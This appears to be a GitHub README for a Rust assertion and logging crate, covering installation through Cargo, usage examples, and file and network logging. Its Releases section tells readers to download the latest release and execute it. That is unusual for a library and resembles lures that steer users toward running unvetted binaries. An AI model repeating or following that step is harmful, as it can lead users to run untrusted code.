# Better Assert

![GitHub Release](https://img.shields.io/github/release/danmorara23/better-assert.svg)

Welcome to the **Better Assert** repository! This project provides enhanced assertion functions and panic handling in Rust, complete with built-in logging features. Whether you are testing your code or debugging, this library aims to make your development process smoother and more efficient.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Logging](#logging)
- [Contributing](#contributing)
- [License](#license)
- [Releases](#releases)

## Features

- **Assertion Functions**: Use `assert`, `assert_eq`, and `assert_ne` with added logging capabilities.
- **Panic Handling**: Customize panic messages and log them for easier debugging.
- **File Logging**: Save logs to files for later review.
- **Network Logging**: Send logs to a remote server for centralized monitoring.
- **Debugging Support**: Get detailed output to help you understand failures.

## Installation

To install **Better Assert**, add the following line to your `Cargo.toml` file:

```toml
[dependencies]
better-assert = "0.1"
```

After adding it, run:

```bash
cargo build
```

This will compile the library and make it available for use in your Rust projects.

## Usage

Here's a simple example of how to use **Better Assert** in your Rust code:

```rust
use better_assert::{assert, assert_eq, assert_ne};

fn main() {
    let a = 5;
    let b = 10;

    assert(a < b, "a should be less than b");
    assert_eq!(a + b, 15, "Sum of a and b should be 15");
    assert_ne!(a, b, "a should not be equal to b");
}
```

This code demonstrates basic assertions with custom messages. If any assertion fails, it will log the error and panic.

## Logging

Logging is a crucial part of debugging. **Better Assert** offers both file and network logging. You can configure logging settings as follows:

### File Logging

To enable file logging, specify a log file in your configuration:

```rust
better_assert::init_file_logging("log.txt").unwrap();
```

This will create a log file named `log.txt` in your project directory.

### Network Logging

For network logging, you can set up a remote server:

```rust
better_assert::init_network_logging("http://your-logging-server.com").unwrap();
```

This will send logs to the specified server, allowing for centralized monitoring.

## Contributing

We welcome contributions! If you want to help improve **Better Assert**, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes.
4. Write tests for your changes.
5. Submit a pull request.

Your contributions help make this project better for everyone.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Releases

For the latest updates and releases, visit our [Releases](https://github.com/danmorara23/better-assert/releases) page. Download the latest version and execute it to take advantage of the newest features and fixes.

If you encounter any issues, please check the "Releases" section for any known problems or updates.

## Conclusion

Thank you for exploring **Better Assert**! We hope this library enhances your Rust development experience. For any questions or suggestions, feel free to reach out or contribute. Your feedback is valuable to us.

For more information, please visit our [Releases](https://github.com/danmorara23/better-assert/releases) page.